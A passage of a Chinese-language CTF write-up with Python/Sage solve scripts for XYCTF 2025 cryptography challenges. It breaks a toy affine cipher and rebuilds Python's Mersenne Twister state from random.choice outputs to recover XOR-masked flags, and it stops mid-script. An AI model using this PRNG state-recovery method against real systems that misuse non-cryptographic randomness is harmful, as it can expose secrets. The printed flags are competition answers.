<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> random

table <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits

r <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">PRNG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1145140</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">19198100</span>
        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>x <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> x
    
    <span class="token keyword">def</span> <span class="token function">round</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> x

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>a <span class="token operator">*</span> table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">19198111</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> msg<span class="token punctuation">]</span>
    <span class="token keyword">return</span> c
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">9474070</span><span class="token punctuation">,</span> <span class="token number">15547185</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">9474070</span><span class="token punctuation">,</span> <span class="token number">6914981</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">1042385</span><span class="token punctuation">,</span> <span class="token number">841866</span><span class="token punctuation">,</span> <span class="token number">13966862</span><span class="token punctuation">,</span> <span class="token number">10051798</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">17103679</span><span class="token punctuation">,</span> <span class="token number">15146147</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">13966862</span><span class="token punctuation">,</span> <span class="token number">14945628</span><span class="token punctuation">,</span> <span class="token number">17103679</span><span class="token punctuation">,</span> <span class="token number">12988096</span><span class="token punctuation">,</span> <span class="token number">841866</span><span class="token punctuation">,</span> <span class="token number">2999917</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">2021151</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">1443423</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">1443423</span><span class="token punctuation">,</span> <span class="token number">14568419</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">4379721</span><span class="token punctuation">]</span>

prng <span class="token operator">=</span> PRNG<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

flag<span class="token operator">=</span><span class="token string">'114'</span>

encc<span class="token operator">=</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
inv_e<span class="token operator">=</span>inverse<span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">-</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">19198111</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inv_e<span class="token punctuation">)</span>

amod<span class="token operator">=</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>inv_e<span class="token operator">%</span><span class="token number">19198111</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>amod<span class="token punctuation">)</span>
inv_a<span class="token operator">=</span>inverse<span class="token punctuation">(</span>amod<span class="token punctuation">,</span><span class="token number">19198111</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inv_a<span class="token punctuation">)</span>
b<span class="token operator">=</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>amod<span class="token operator">*</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">19198111</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">*</span>inv_a<span class="token operator">%</span><span class="token number">19198111</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


</code></pre>

<p>114514fixedpointissodangerous1919810</p>
<h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long
<span class="token keyword">from</span> random <span class="token keyword">import</span> Random
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'XYCTF&#123;'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b'&#125;'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

msg <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
rand <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
test <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.py'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'enc = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>msg <span class="token operator">^</span> rand<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\nr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>rand<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>test<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2496</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></code></pre>

<p>给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可</p>
<p>m长度可能与e有偏差，多试两位即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

test <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

Dall<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> r<span class="token punctuation">:</span>
    Dall<span class="token punctuation">.</span>append<span class="token punctuation">(</span>test<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>
D<span class="token operator">=</span>Dall
rng<span class="token operator">=</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getRows</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。</span>
    row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        row<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> row
M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#这一部分为固定套路，具体原因已经写在注释中了</span>

    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>
    temp <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token string">"1"</span><span class="token operator">*</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token punctuation">:</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#这个setstate也是固定格式，已于2025.1.21测试</span>
    M<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getRows<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span>


M<span class="token operator">=</span>Matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>M<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>M<span class="token punctuation">.</span>rank<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------------------------------------------'</span><span class="token punctuation">)</span>

y<span class="token operator">=</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
s<span class="token operator">=</span>M<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>y<span class="token punctuation">)</span>


G<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    C<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        C<span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>
        C<span class="token operator">|</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>C<span class="token punctuation">)</span>

<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>G<span class="token punctuation">)</span>


<span class="token comment"># G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    

<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
RNG1<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">from</span> extend_mt19937_predictor <span class="token keyword">import</span> ExtendMT19937Predictor

predictor <span class="token operator">=</span> ExtendMT19937Predictor<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    predictor<span class="token punctuation">.</span>setrandbits<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    predictor<span class="token punctuation">.</span>backtrack_getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    
key<span class="token operator">=</span>predictor<span class="token punctuation">.</span>backtrack_getrandbits<span class="token punctuation">(</span>e<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>e<span class="token operator">^</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p><em><strong>0h_51mple_r@nd0m</strong></em></p>
<h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><p>四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r</p>
<p>但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ComComplex</span><span class="token punctuation">:</span>
